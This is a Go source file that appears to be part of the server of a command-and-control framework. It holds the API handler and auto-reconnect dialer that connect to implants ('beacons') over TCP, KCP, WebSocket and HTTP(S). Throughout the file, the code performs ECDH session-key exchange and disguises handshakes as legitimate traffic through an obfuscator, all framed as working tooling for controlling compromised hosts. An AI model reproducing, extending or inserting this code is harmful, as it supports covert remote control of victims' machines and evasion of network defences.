package api

import (
	k "BackendTemplate/pkg/connection/kcp"
	"BackendTemplate/pkg/connection/tcp"
	"BackendTemplate/pkg/connection/websocket"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/security"
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"BackendTemplate/pkg/utils/logx"
	"github.com/gin-gonic/gin"
	gorillaws "github.com/gorilla/websocket"
	"github.com/xtaci/kcp-go/v5"
)

// ForwardConnectRequest 正向连接请求体
type ForwardConnectRequest struct {
	IsEbpfClient     bool   `json:"isEbpfClient"`     // true: Linux 正向客户端（标签语义，连接通道同 TCP/KCP/WebSocket）
	ConnectionMethod string `json:"connectionMethod"` // 连接方式: TCP, KCP/UDP, WebSocket
	IPAddress        string `json:"ipAddress"`        // 正向客户端监听的IP地址（支持域名）
	Port             string `json:"port"`             // 正向客户端监听的端口
	Password         string `json:"password"`         // 兼容字段：正向协议无密码握手，忽略
	Vkey             string `json:"vkey"`             // 兼容字段：密钥由监听器配置提供，忽略
	EncryptionSalt   string `json:"encryptionSalt"`   // 兼容字段：密钥由监听器配置提供，忽略
}

// ConnectForwardClient 服务端连接正向客户端
func ConnectForwardClient(c *gin.Context) {
	var req ForwardConnectRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "请求参数无效",
			"error":   err.Error(),
		})
		return
	}

	// 验证必需参数
	if req.IPAddress == "" || strings.ContainsAny(req.IPAddress, " \t") {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "IP地址不能为空",
		})
		return
	}

	if req.Port == "" {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "端口不能为空",
		})
		return
	}

	// 验证端口号
	port, err := strconv.Atoi(req.Port)
	if err != nil || port < 1 || port > 65535 {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "端口号无效，必须是1-65535之间的数字",
		})
		return
	}

	// 验证连接方式
	validMethods := map[string]bool{
		"TCP":       true,
		"KCP/UDP":   true,
		"WebSocket": true,
		"HTTP":      true,
		"HTTPS":     true,
	}

	if !validMethods[req.ConnectionMethod] {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "不支持的连接方式",
		})
		return
	}

	logx.Infof("🔗 [FORWARD-CONNECT] 开始连接正向客户端: %s:%s (%s, ebpf=%t)\n", req.IPAddress, req.Port, req.ConnectionMethod, req.IsEbpfClient)

	// 构建连接地址
	targetAddress := fmt.Sprintf("%s:%s", req.IPAddress, req.Port)
	if isUnspecifiedForwardTarget(targetAddress) {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "回连地址不能是 0.0.0.0/::（那是客户端绑定地址，不是服务端可拨目标）",
		})
		return
	}

	// 手动连接支持显式会话密钥（与服务端/客户端 patched 密钥一致）；
	// 空值先按目标地址找该监听器记录自己的密钥，找不到才交给连接路径按类型回落。
	masterKey, salt := resolveForwardConnectKeys(targetAddress, req.Vkey, req.EncryptionSalt)

	// 根据连接方式进行连接
	var err_connect error

	switch req.ConnectionMethod {
	case "TCP":
		err_connect = connectTCPForward(targetAddress, masterKey, salt)
	case "WebSocket":
		err_connect = connectWebSocketForward(targetAddress, masterKey, salt)
	case "KCP/UDP":
		err_connect = connectKCPForward(targetAddress, masterKey, salt)
	case "HTTP":
		err_connect = connectHTTPForward(targetAddress, masterKey, salt)
	case "HTTPS":
		err_connect = connectHTTPSForward(targetAddress, masterKey, salt)
	default:
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  400,
			"message": "不支持的连接方式",
		})
		return
	}

	if err_connect != nil {
		logx.Errorf("❌ [FORWARD-CONNECT] 连接失败: %v\n", err_connect)
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": fmt.Sprintf("连接正向客户端失败: %v", err_connect),
		})
		return
	}

	logx.Infof("✅ [FORWARD-CONNECT] 成功连接到正向客户端: %s\n", targetAddress)

	c.JSON(http.StatusOK, gin.H{
		"status":  200,
		"message": "正向连接建立成功",
		"data": gin.H{
			"target_address":    targetAddress,
			"connection_method": req.ConnectionMethod,
			"client_type":       getClientType(req.IsEbpfClient),
		},
	})
}

// padForwardKeys 补齐主密钥(32)/盐(16)，返回 (nil, nil) 表示使用监听器默认配置。
// 带脱敏标记的值来自监听器列表的预览（前端"连接"按钮直接携带该监听器的 VKey/盐），
// 同样视为未提供——交给连接路径按监听器配置取真实密钥。
func padForwardKeys(vkey, encryptSalt string) ([]byte, []byte) {
	if vkey == "" || encryptSalt == "" || isMaskedValue(vkey) || isMaskedValue(encryptSalt) {
		return nil, nil
	}
	masterKey := make([]byte, 32)
	copy(masterKey, []byte(vkey))
	salt := make([]byte, 16)
	copy(salt, []byte(encryptSalt))
	return masterKey, salt
}

// resolveForwardConnectKeys 手动连接用哪套密钥：
//  1. 请求显式给了真实 VKey/盐（未脱敏）→ 用它；
//  2. 否则按目标地址查监听器记录，用记录自己的密钥——同协议可以有多条正向监听器，
//     按类型取库中第一条会让第二条起用错密钥；
//  3. 都取不到返回 nil，交给连接路径按类型回落（历史记录兼容）。
func resolveForwardConnectKeys(targetAddress, vkey, salt string) ([]byte, []byte) {
	if mk, s := padForwardKeys(vkey, salt); mk != nil {
		return mk, s
	}
	if database.DB() != nil {
		if lis, has, _ := database.Listeners().FindByConnectOrListen(targetAddress); has &&
			lis.VKey != "" && lis.EncryptionSalt != "" {
			return encrypt.NormalizeListenerKeyConfig([]byte(lis.VKey), []byte(lis.EncryptionSalt))
		}
	}
	return nil, nil
}

// connectTCPForward 连接TCP正向客户端（复用反向 TCP 协议处理，协议帧完全一致）
func connectTCPForward(address string, masterKey, salt []byte) error {
	sess, err := dialForwardSession("tcp_forward", address, masterKey, salt)
	if err != nil {
		return err
	}
	go sess.run()
	return nil
}

// connectWebSocketForward 连接WebSocket正向客户端（客户端本地提供 /ws 服务）
func connectWebSocketForward(address string, masterKey, salt []byte) error {
	sess, err := dialForwardSession("ws_forward", address, masterKey, salt)
	if err != nil {
		return err
	}
	go sess.run()
	return nil
}

// connectKCPForward 连接KCP正向客户端
func connectKCPForward(address string, masterKey, salt []byte) error {
	sess, err := dialForwardSession("kcp_forward", address, masterKey, salt)
	if err != nil {
		return err
	}
	go sess.run()
	return nil
}

// connectHTTPForward 连接HTTP正向客户端（客户端 Hijack 转原始协议流，复用 tcp_forward 分帧协议）
func connectHTTPForward(address string, masterKey, salt []byte) error {
	sess, err := dialForwardSession("http_forward", address, masterKey, salt)
	if err != nil {
		return err
	}
	go sess.run()
	return nil
}

// connectHTTPSForward 连接HTTPS正向客户端（自签证书，跳过校验）
func connectHTTPSForward(address string, masterKey, salt []byte) error {
	sess, err := dialForwardSession("https_forward", address, masterKey, salt)
	if err != nil {
		return err
	}
	go sess.run()
	return nil
}

// bufferedConn 先读缓冲再读底层连接的 net.Conn 包装：
// HTTP 握手响应与 firstBlood 可能同段到达，ReadResponse 会把 firstBlood 吞进 bufio，需保留缓冲
type bufferedConn struct {
	net.Conn
	reader *bufio.Reader
}

func (c *bufferedConn) Read(p []byte) (int, error) { return c.reader.Read(p) }

// dialHTTPForwardSession HTTP(S) 正向拨号与握手，返回可阻塞运行的会话。
func dialHTTPForwardSession(listenerType, address string, masterKey, salt []byte) (*forwardSession, error) {
	useTLS := listenerType == "https_forward"
	scheme := "http"
	var conn net.Conn
	var err error
	start := time.Now()
	if useTLS {
		// J8: 启用 TLS 证书校验（原 InsecureSkipVerify: true → 中间人风险）
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", address,
			&tls.Config{InsecureSkipVerify: false})
		scheme = "https"
	} else {
		conn, err = net.DialTimeout("tcp", address, 10*time.Second)
	}
	if err != nil {
		reportForwardMetrics(false, start)
		return nil, fmt.Errorf("%s连接失败: %v", scheme, err)
	}

	// P3-2: 握手请求经流量混淆器生成（伪装为合法业务流量）。
	// 客户端 HTTP-forward 对任何合法 HTTP 请求都会 Hijack 转原始流，混淆不破坏协议。
	var handshake []byte
	if security.GlobalTrafficObfuscator != nil {
		if obfReq, oerr := security.GlobalTrafficObfuscator.ObfuscateRequest(nil, ""); oerr == nil {
			var buf strings.Builder
			buf.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n", obfReq.URL.RequestURI(), address))
			obfReq.Header.Write(&buf)
			buf.WriteString("\r\n")
			handshake = []byte(buf.String())
		}
	}
	if len(handshake) == 0 {
		// 混淆器不可用时的回退握手
		handshake = []byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n", address))
	}
	if _, err := conn.Write(handshake); err != nil {
		conn.Close()
		reportForwardMetrics(false, start)
		return nil, fmt.Errorf("发送HTTP请求失败: %v", err)
	}

	// 读取 HTTP 200 响应头，随后连接转为原始协议流（保留 bufio 缓冲，防 firstBlood 被吞）
	reader := bufio.NewReader(conn)
	if _, err := http.ReadResponse(reader, &http.Request{Method: "GET"}); err != nil {
		conn.Close()
		reportForwardMetrics(false, start)
		return nil, fmt.Errorf("HTTP握手失败: %v", err)
	}
	reportForwardMetrics(true, start)
	wrapped := &bufferedConn{Conn: conn, reader: reader}

	run := func() {
		if len(masterKey) > 0 && len(salt) > 0 {
			tcp.HandleTcpConnectionForWithKeys(wrapped, listenerType, masterKey, salt)
		} else {
			tcp.HandleTcpConnectionFor(wrapped, listenerType)
		}
	}
	// closer 用底层 conn：run 阻塞在 wrapped 的读循环里，关闭底层连接才能让它返回
	return &forwardSession{closer: conn, run: run}, nil
}

// forwardSession 一条已建立的正向会话。
// run 阻塞运行协议读循环，返回即会话结束——自动拨号靠它感知掉线并重连；
// closer 用于主动断开（关闭监听器时 run 正阻塞在读循环里，只发停止信号不会让它返回）。
type forwardSession struct {
	closer io.Closer
	run    func()
}

// dialForwardSession 按监听器类型建立一条正向会话（拨号 + 握手），不启动协议循环。
// 手动连接（ConnectForwardClient）与自动拨号（runForwardDialer）共用本函数，
// 差别只在生命周期由谁持有：手动连接把 run 交给 goroutine 即返回，自动拨号需同步等待。
func dialForwardSession(listenerType, address string, masterKey, salt []byte) (*forwardSession, error) {
	withKeys := len(masterKey) > 0 && len(salt) > 0

	switch listenerType {
	case "tcp_forward":
		logx.Infof("🔗 [TCP-FORWARD] 尝试连接TCP正向客户端: %s\n", address)
		conn, err := net.DialTimeout("tcp", address, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("TCP连接失败: %v", err)
		}
		run := func() {
			if withKeys {
				tcp.HandleForwardConnectionWithKeys(conn, masterKey, salt)
			} else {
				tcp.HandleForwardConnection(conn)
			}
		}
		return &forwardSession{closer: conn, run: run}, nil

	case "ws_forward":
		logx.Infof("🔗 [WS-FORWARD] 尝试连接WebSocket正向客户端: %s\n", address)
		// 会话前 ECDH 交换（与反向 ws 方向相反：这里 C2 是拨号方，
		// 所以由 C2 发起 —— 拨号带客户端公钥，从升级响应头取 beacon 公钥派生）。
		// withKeys 为假时没有盐可用，跳过交换，保持原有静态密钥行为。
		kxHdr := http.Header{}
		// 客户端侧 KeyExchange 在 implant module，本 module 不可见；
		// X25519+HKDF 两端对称，故用 ServerKeyExchange 充当拨号方实现。
		var kxSrv *encrypt.ServerKeyExchange
		if withKeys {
			if s, kerr := encrypt.NewServerKeyExchange(); kerr == nil {
				kxSrv = s
				kxHdr.Set(encrypt.KxHeaderName, s.HeaderValue())
			}
		}
		ws, resp, err := gorillaws.DefaultDialer.Dial("ws://"+address+"/ws", kxHdr)
		if err != nil {
			return nil, fmt.Errorf("WebSocket连接失败: %v", err)
		}
		var derivedMK []byte
		if kxSrv != nil && resp != nil {
			if peerPub, perr := encrypt.ParsePeerPublicKey(resp.Header.Get(encrypt.KxHeaderName)); perr == nil {
				if mk, derr := kxSrv.DeriveMasterKey(peerPub, salt); derr == nil {
					derivedMK = mk
				} else {
					logx.Warnf("⚠️ [WS-FORWARD-KX] 派生失败，回落静态密钥: %v\n", derr)
				}
			}
		}
		run := func() {
			switch {
			case len(derivedMK) > 0:
				websocket.HandleWebSocketForWithDerivedKey(ws, masterKey, salt, derivedMK)
			case withKeys:
				websocket.HandleWebSocketForWithKeys(ws, masterKey, salt)
			default:
				websocket.HandleWebSocketFor(ws)
			}
		}
		return &forwardSession{closer: ws, run: run}, nil

	case "kcp_forward":
		logx.Infof("🔗 [KCP-FORWARD] 尝试连接KCP正向客户端: %s\n", address)
		sess, err := kcp.DialWithOptions(address, nil, 10, 3)
		if err != nil {
			return nil, fmt.Errorf("KCP连接失败: %v", err)
		}
		sess.SetWindowSize(1024, 1024)
		sess.SetNoDelay(1, 20, 2, 1)
		sess.SetMtu(1400)
		//lint:ignore SA1019 kcp-go 未提供替代 API；该方法按 enable 置位流模式标志（非切换），语义即"启用"
		sess.SetStreamMode(true)
		run := func() {
			if withKeys {
				k.HandleKCPForwardConnectionWithKeys(sess, masterKey, salt)
			} else {
				k.HandleKCPForwardConnection(sess)
			}
		}
		return &forwardSession{closer: sess, run: run}, nil

	case "http_forward", "https_forward":
		return dialHTTPForwardSession(listenerType, address, masterKey, salt)

	default:
		return nil, fmt.Errorf("不支持的正向连接类型: %s", listenerType)
	}
}

// reportForwardMetrics 将正向连接结果喂回混淆器网络质量监控（驱动协议切换规则，
// 原切换调度器无真实数据来源，失败/延迟规则永不触发）
func reportForwardMetrics(success bool, start time.Time) {
	if security.GlobalTrafficObfuscator == nil {
		return
	}
	latency := time.Since(start)
	security.GlobalTrafficObfuscator.UpdateNetworkMetrics(
		security.GlobalTrafficObfuscator.GetCurrentProfile(), success, latency, latency)
}

// getClientType 获取客户端类型描述
func getClientType(isEbpfClient bool) string {
	if isEbpfClient {
		return "Linux正向客户端"
	}
	return "Windows正向客户端"
}

// 自动拨号的重连退避：目标长期不可达时避免高频重试，成功建立会话即重置为下限
const (
	forwardDialMinBackoff = 5 * time.Second
	forwardDialMaxBackoff = 60 * time.Second
)

// forwardSessions 正向监听器当前活跃会话（key: 监听器地址）。
// 关闭监听器时必须主动断开会话：run 阻塞在协议读循环里，只发停止信号不会让它返回。
var (
	forwardSessionsMu sync.Mutex
	forwardSessions   = make(map[string]*forwardSession)
)

// closeForwardSession 摘除并关闭指定监听器的活跃会话（关闭监听器时调用）。无活跃会话时为 no-op。
func closeForwardSession(listenerAddress string) {
	forwardSessionsMu.Lock()
	sess := forwardSessions[listenerAddress]
	delete(forwardSessions, listenerAddress)
	forwardSessionsMu.Unlock()
	if sess != nil && sess.closer != nil {
		if err := sess.closer.Close(); err != nil {
			logx.Warnf("⚠️ [正向拨号] %s 会话关闭失败: %v\n", listenerAddress, err)
		}
	}
}

// runForwardDialer 正向监听器的自动拨号循环（server.go 自动创建记录处注释所称
// "启用后由 handleOpenPort 自动拨号"）。持续把 target 上的正向客户端接上来，
// 拨号失败或会话结束都按退避重连，直到 stopCh 收到停止信号。
// 会话由 run 同步持有（不像手动连接那样交给 goroutine），因此能感知掉线并重连。
func runForwardDialer(listenerType, target string, masterKey, salt []byte, stopCh <-chan bool) {
	runForwardDialerWith(stopCh, forwardDialMinBackoff, forwardDialMaxBackoff, listenerType, target,
		func() (*forwardSession, error) {
			return dialForwardSession(listenerType, target, masterKey, salt)
		})
}

// runForwardDialerWith 拨号循环本体。dial 与退避参数可注入，便于测试重连与停止语义。
func runForwardDialerWith(stopCh <-chan bool, minBackoff, maxBackoff time.Duration,
	listenerType, target string, dial func() (*forwardSession, error)) {

	backoff := minBackoff
	for {
		if forwardDialStopped(stopCh) {
			logx.Infof("🛑 [正向拨号] %s://%s 已停止\n", listenerType, target)
			return
		}

		sess, err := dial()
		if err != nil {
			logx.Warnf("⚠️ [正向拨号] %s://%s 拨号失败: %v（%s 后重试）\n", listenerType, target, err, backoff)
			if !forwardDialSleep(stopCh, backoff) {
				logx.Infof("🛑 [正向拨号] %s://%s 已停止\n", listenerType, target)
				return
			}
			backoff = forwardDialGrowBackoff(backoff, maxBackoff)
			continue
		}

		logx.Infof("✅ [正向拨号] %s://%s 会话已建立\n", listenerType, target)
		backoff = minBackoff

		forwardSessionsMu.Lock()
		forwardSessions[target] = sess
		forwardSessionsMu.Unlock()

		runForwardSession(sess, listenerType, target)

		forwardSessionsMu.Lock()
		if forwardSessions[target] == sess {
			delete(forwardSessions, target)
		}
		forwardSessionsMu.Unlock()

		if forwardDialStopped(stopCh) {
			logx.Infof("🛑 [正向拨号] %s://%s 已停止\n", listenerType, target)
			return
		}
		logx.Warnf("🔌 [正向拨号] %s://%s 会话结束，%s 后重连\n", listenerType, target, backoff)
		if !forwardDialSleep(stopCh, backoff) {
			logx.Infof("🛑 [正向拨号] %s://%s 已停止\n", listenerType, target)
			return
		}
		backoff = forwardDialGrowBackoff(backoff, maxBackoff)
	}
}

// runForwardSession 阻塞运行会话协议循环并兜住 panic——拨号循环跑在自己的 goroutine 里，
// 协议循环 panic 若逃逸会直接杀死整个 C2 进程（与其他连接入口的 recover 防护一致）。
// 返回后统一关闭底层连接，避免 panic 路径下连接泄漏。
func runForwardSession(sess *forwardSession, listenerType, target string) {
	defer func() {
		if r := recover(); r != nil {
			logx.Errorf("❌ [正向拨号] %s://%s 会话 panic 已捕获: %v\n", listenerType, target, r)
		}
		if sess.closer != nil {
			// 幂等：协议循环正常结束时连接已关闭，重复关闭仅返回错误，忽略
			_ = sess.closer.Close()
		}
	}()
	sess.run()
}

// forwardDialStopped 非阻塞检查停止信号
func forwardDialStopped(stopCh <-chan bool) bool {
	select {
	case <-stopCh:
		return true
	default:
		return false
	}
}

// forwardDialSleep 等待 d，期间收到停止信号立即返回 false
func forwardDialSleep(stopCh <-chan bool, d time.Duration) bool {
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-stopCh:
		return false
	case <-t.C:
		return true
	}
}

// forwardDialGrowBackoff 退避翻倍至上限
func forwardDialGrowBackoff(cur, max time.Duration) time.Duration {
	next := cur * 2
	if next > max {
		return max
	}
	return next
}
